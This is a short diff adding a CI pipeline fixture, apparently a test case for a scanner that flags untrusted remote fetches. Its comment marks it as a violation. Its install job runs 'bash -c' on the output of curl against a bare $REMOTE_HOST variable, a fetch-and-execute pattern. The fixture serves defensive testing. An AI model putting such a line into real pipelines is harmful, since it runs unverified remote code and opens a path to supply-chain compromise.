@@ -1,0 +1,9 @@
+# violation: a fetch command whose own text carries no URL, IP or
+# hostname at all (a bare shell variable, no path) must never be given
+# the benefit of the doubt. A fetch command from which no target can be
+# extracted is read as untrusted, not as an empty, harmless contribution
+# to the trust set, even with a trustedUrls allowlist configured.
+install:
+  image: alpine:3.19
+  script:
+    - bash -c "$(curl -fsSL $REMOTE_HOST)"
